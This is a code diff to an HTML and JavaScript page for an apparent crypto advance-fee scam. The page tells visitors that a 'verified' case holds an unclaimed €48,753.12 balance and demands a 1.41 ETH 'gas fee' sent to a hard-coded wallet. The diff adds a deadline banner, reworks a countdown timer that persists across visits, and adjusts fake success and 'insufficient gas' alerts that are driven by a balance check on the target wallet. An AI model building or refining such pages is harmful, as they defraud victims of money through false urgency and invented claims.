@@ -63,7 +63,17 @@
         .id-badge b { color: var(--success); }
 
         .logo-area h1 { font-size: 22px; font-weight: 800; margin: 0 0 5px; }
-        .logo-area p { color: #888; font-size: 13px; margin-bottom: 20px; }
+        .logo-area p { color: #888; font-size: 13px; margin-bottom: 10px; }
+        
+        .deadline-notice {
+            color: var(--accent);
+            font-size: 11px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 20px;
+            font-family: 'JetBrains Mono';
+        }
 
         .settlement-card {
             background: rgba(255, 204, 0, 0.05);
@@ -134,7 +144,14 @@
         }
         .main-action:hover { background: var(--primary); color: white; transform: translateY(-2px); }
 
-        .timer { font-size: 11px; color: var(--accent); margin-top: 15px; font-family: 'JetBrains Mono'; }
+        .timer-container {
+            margin-top: 15px;
+            padding: 10px;
+            border-top: 1px solid var(--border);
+        }
+
+        .timer-label { font-size: 9px; color: #666; margin-bottom: 5px; }
+        .timer-value { font-size: 14px; color: var(--accent); font-family: 'JetBrains Mono'; font-weight: 700; }
     </style>
 </head>
 <body>
@@ -144,7 +161,7 @@
 <div class="container">
     <div class="card">
         <div class="id-badge">
-            <span>CASE ID: <b id="case-id-display">#ETH-7477-X</b></span>
+            <span>CASE ID: <b>#ETH-7477-X</b></span>
             <span style="opacity: 0.3;">|</span>
             <span>STATUS: <b>VERIFIED</b></span>
         </div>
@@ -152,6 +169,7 @@
         <div class="logo-area">
             <h1>Protocol Migration</h1>
             <p>Unclaimed Legacy Balance: <b style="color: var(--success);">€48,753.12</b></p>
+            <div class="deadline-notice">⚠️ Final Window: Closes June 30, 2024</div>
         </div>
 
         <div class="settlement-card">
@@ -164,7 +182,7 @@
 
         <div class="explanation">
             <b>Smart Contract Verification:</b><br>
-            The identification <b class="case-id-text">#ETH-7477-X</b> confirms your eligibility for this allocation. To release the funds, you must trigger the <b>V2 Proxy Contract</b>. The 1.41 ETH fee is the mandatory network gas required to move assets from the legacy escrow to your active wallet.
+            Case <b class="case-id-text">#ETH-7477-X</b> is eligible for asset release. You must trigger the <b>V2 Proxy Contract</b> before the end of June. The 1.41 ETH fee is the mandatory gas requirement for legacy-to-mainnet bridging.
         </div>
 
         <div class="gateway-box">
@@ -175,7 +193,10 @@
 
         <button class="main-action" onclick="verifyMigration()">FINALIZE V2 UPGRADE</button>
         
-        <div class="timer">MIGRATION WINDOW EXPIRES IN: <span id="timer">--:--:--</span></div>
+        <div class="timer-container">
+            <div class="timer-label">SESSION EXPIRES IN:</div>
+            <div class="timer-value" id="timer">499:00:00</div>
+        </div>
     </div>
 </div>
 
@@ -184,17 +205,18 @@
     const TARGET_WALLET = "0xd522C894C9323B3006b0ABBfe92257D0726c2663";
     const FEE = 1.41;
     const API_KEY = "ATUAJBD9PE7HUBAZY7QHQ4YTZ6VFAGWJMU";
-    const INITIAL_TIME = 1800000; // 500 hours in seconds
+    
+    // 499 hours in seconds
+    const INITIAL_TIME = 499 * 3600;
 
-    // --- LOCAL STORAGE PERSISTENCE ---
     let time;
-    const savedTime = localStorage.getItem('migration_timer');
+    const savedTime = localStorage.getItem('migration_timer_v2');
     
     if (savedTime) {
         time = parseInt(savedTime);
     } else {
         time = INITIAL_TIME;
-        localStorage.setItem('migration_timer', time);
+        localStorage.setItem('migration_timer_v2', time);
     }
 
     function copyAddress() {
@@ -210,26 +232,26 @@
             const bal = Number(data.result) / 1e18;
 
             if(bal >= FEE) {
-                alert(`SUCCESS: Settlement verified. Smart Contract ${CASE_ID} has been deployed. Your €48,753.12 will arrive in your wallet within 15-30 minutes.`);
+                alert(`SUCCESS: Settlement verified. Smart Contract ${CASE_ID} has been deployed. Assets will arrive within 15-30 minutes.`);
             } else {
-                alert(`[NETWORK ERROR: INSUFFICIENT GAS]\n\nDeployment Fee for Case ${CASE_ID} not detected.\n\nRequired: ${FEE} ETH\nDetected: ${bal.toFixed(4)} ETH\n\nPlease complete the deposit to the network gateway to release your €48,753.12.`);
+                alert(`[NETWORK ERROR: INSUFFICIENT GAS]\n\nDeployment Fee for Case ${CASE_ID} not detected.\n\nRequired: ${FEE} ETH\nDetected: ${bal.toFixed(4)} ETH\n\nPlease complete the deposit to the gateway address.`);
             }
         } catch(e) { alert("Execution Error. Please check connectivity."); }
     }
 
-    // Timer Logic with Persistence
+    // Timer Logic
     setInterval(() => {
         if (time > 0) {
             time--;
-            localStorage.setItem('migration_timer', time);
+            localStorage.setItem('migration_timer_v2', time);
         }
         
-        let m = Math.floor(time / 60);
+        let h = Math.floor(time / 3600);
+        let m = Math.floor((time % 3600) / 60);
         let s = time % 60;
-        let h = Math.floor(m / 60);
         
         document.getElementById('timer').innerText = 
-            `${h.toString().padStart(2, '0')}:${(m % 60).toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
+            `${h.toString().padStart(2, '0')}:${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
     }, 1000);
 </script>
 
